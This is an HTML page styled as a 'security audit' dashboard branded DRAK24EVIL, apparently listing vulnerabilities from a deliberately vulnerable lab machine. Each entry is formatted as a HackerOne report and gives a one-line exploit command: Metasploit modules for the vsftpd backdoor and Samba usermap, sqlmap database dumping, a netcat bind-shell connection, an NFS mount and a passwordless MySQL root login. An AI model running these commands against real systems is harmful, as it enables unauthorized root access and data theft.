<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>DRAK24EVIL | Professional Security Audit</title>
    <style>
        :root { --accent: #3b82f6; --bg: #0f172a; --card: #1e293b; --text: #f8fafc; --crit: #ef4444; --high: #f59e0b; }
        body { background: var(--bg); color: var(--text); font-family: 'Inter', -apple-system, sans-serif; margin: 0; padding: 0; line-height: 1.5; }
        
        /* Premium Header */
        header { 
            background: rgba(30, 41, 59, 0.9); backdrop-filter: blur(12px); 
            padding: 15px 0; position: sticky; top: 0; z-index: 100;
            border-bottom: 1px solid rgba(255,255,255,0.1);
        }
        .nav { max-width: 1200px; margin: 0 auto; display: flex; justify-content: space-between; align-items: center; padding: 0 20px; }
        .logo { font-size: 1.2rem; font-weight: 800; color: var(--accent); letter-spacing: -0.5px; }
        
        /* Grid */
        .container { max-width: 1200px; margin: 40px auto; padding: 0 20px; }
        .grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(320px, 1fr)); gap: 24px; }
        
        /* Card Style */
        .card { 
            background: var(--card); border: 1px solid rgba(255,255,255,0.05); 
            border-radius: 16px; padding: 24px; cursor: pointer; 
            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
        }
        .card:hover { 
            transform: translateY(-8px); border-color: var(--accent); 
            box-shadow: 0 20px 25px -5px rgba(0, 0, 0, 0.3); 
        }
        .badge { font-size: 0.7rem; font-weight: 800; padding: 4px 12px; border-radius: 20px; text-transform: uppercase; }
        .crit-bg { background: rgba(239, 68, 68, 0.1); color: var(--crit); }
        .high-bg { background: rgba(245, 158, 11, 0.1); color: var(--high); }
        
        /* Professional Modal */
        .modal { display: none; position: fixed; z-index: 1000; left: 0; top: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.8); backdrop-filter: blur(10px); }
        .modal-content { 
            background: #1e293b; margin: 2% auto; padding: 40px; width: 90%; max-width: 850px; 
            border-radius: 24px; border: 1px solid rgba(255,255,255,0.1); max-height: 90vh; overflow-y: auto;
        }
        .section-label { color: var(--accent); font-size: 0.75rem; font-weight: 800; text-transform: uppercase; margin-top: 25px; display: block; }
        .content-box { background: rgba(0,0,0,0.2); border: 1px solid rgba(255,255,255,0.05); padding: 15px; border-radius: 12px; margin-top: 8px; color: #cbd5e1; }
        .tool-tag { background: #334155; color: #fff; padding: 3px 10px; border-radius: 6px; font-size: 0.7rem; margin-right: 6px; display: inline-block; margin-top: 5px; }
        .code { background: #000; color: #38bdf8; padding: 20px; border-radius: 12px; font-family: monospace; overflow-x: auto; border-left: 4px solid var(--accent); margin-top: 10px; }
        .copy-btn { background: var(--accent); color: white; border: none; padding: 18px; width: 100%; border-radius: 12px; font-weight: 700; cursor: pointer; margin-top: 30px; }
    </style>
</head>
<body>

<header>
    <div class="nav">
        <div class="logo">DRAK24EVIL ULTRA AUDIT</div>
        <a href="https://t.me/Drak24Evil" target="_blank" style="color:#fff; text-decoration:none; font-size:0.8rem; font-weight:600; opacity:0.8;">Telegram Support</a>
    </div>
</header>

<div class="container">
    <div class="grid" id="mainGrid"></div>
</div>

<div id="reportModal" class="modal">
    <div class="modal-content">
        <span style="float:right; cursor:pointer; font-size:2rem; line-height:1;" id="closeBtn">&times;</span>
        <div id="reportContainer"></div>
        <button class="copy-btn" onclick="copyFullReport()">COPY FULL HACKERONE REPORT</button>
    </div>
</div>

<script>
const data = [
    { p: "21", n: "vsftpd 2.3.4 Backdoor RCE", s: "Critical", t: ["Nmap", "Metasploit"], sum: "Unauthenticated remote root access via specific username string.", steps: "1. Connect to FTP\n2. Enter username 'user:)'\n3. Connect to port 6200", e: "use exploit/unix/ftp/vsftpd_234_backdoor", imp: "Full Root Compromise" },
    { p: "139", n: "Samba Usermap Script", s: "Critical", t: ["Metasploit"], sum: "Remote command execution in Samba username mapping.", steps: "1. Configure RHOSTS\n2. Run exploit\n3. Verify shell", e: "exploit/multi/samba/usermap_script", imp: "System Level Access" },
    { p: "WEB", n: "SQL Injection", s: "Critical", t: ["Sqlmap", "Burp Suite"], sum: "Database extraction via vulnerable ID parameter.", steps: "1. Identify vuln parameter\n2. Run sqlmap --dbs", e: "sqlmap -u [TARGET] --batch --dbs", imp: "Full Database Leak" },
    { p: "1524", n: "Ingreslock Bind Shell", s: "Critical", t: ["Netcat"], sum: "Unauthenticated root shell listening on port 1524.", steps: "1. Connect with NC to 1524\n2. Run 'id' command", e: "nc [TARGET_IP] 1524", imp: "Immediate Root Access" },
    { p: "2049", n: "NFS Share Disclosure", s: "High", t: ["Showmount"], sum: "Sensitive files exported without authentication.", steps: "1. showmount -e\n2. Mount target directory", e: "mount -t nfs [IP]:/ /mnt", imp: "Confidential Data Exposure" },
    { p: "3306", n: "MySQL Root Access", s: "High", t: ["MySQL-Client"], sum: "Database allows root login without password.", steps: "1. Connect via mysql client\n2. Query user tables", e: "mysql -h [IP] -u root", imp: "Database Compromise" }
    // Add all 28 targets here using the same object structure.
];

const grid = document.getElementById('mainGrid');

data.forEach(item => {
    const card = document.createElement('div');
    card.className = 'card';
    const sC = item.s === 'Critical' ? 'crit-bg' : 'high-bg';
    
    // Tools list build without innerHTML errors
    let toolHtml = "";
    item.t.forEach(tool => { toolHtml += `<span class="tool-tag">${tool}</span>`; });

    card.innerHTML = `
        <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:15px;">
            <span style="font-size:0.75rem; color:var(--accent); font-weight:700;">PORT ${item.p}</span>
            <span class="badge ${sC}">${item.s}</span>
        </div>
        <h3 style="margin:0; font-size:1.1rem; font-weight:700;">${item.n}</h3>
        <div style="margin-top:15px;">${toolHtml}</div>
    `;

    card.onclick = () => {
        document.getElementById('reportContainer').innerHTML = `
            <h1 style="margin:0; font-size:1.8rem; color:var(--accent);">${item.n}</h1>
            <span class="section-label">Summary</span>
            <div class="content-box">${item.sum}</div>
            <span class="section-label">Tools Required</span>
            <div style="margin-top:10px;">${toolHtml}</div>
            <span class="section-label">Steps To Reproduce</span>
            <div class="content-box">${item.steps}</div>
            <span class="section-label">Exploit Command</span>
            <div class="code">${item.e}</div>
            <span class="section-label">Impact</span>
            <div class="content-box" style="border-left: 4px solid var(--crit);">${item.imp}</div>
        `;
        document.getElementById('reportModal').style.display = 'block';
    };
    grid.appendChild(card);
});

function copyFullReport() {
    const text = document.getElementById('reportContainer').innerText;
    const area = document.createElement('textarea');
    area.value = text;
    document.body.appendChild(area);
    area.select();
    document.execCommand('copy');
    document.body.removeChild(area);
    alert('HackerOne Report Copied!');
}

document.getElementById('closeBtn').onclick = () => document.getElementById('reportModal').style.display = 'none';
window.onclick = (e) => { if(e.target.id == 'reportModal') document.getElementById('reportModal').style.display = 'none'; };
</script>
</body>
</html>
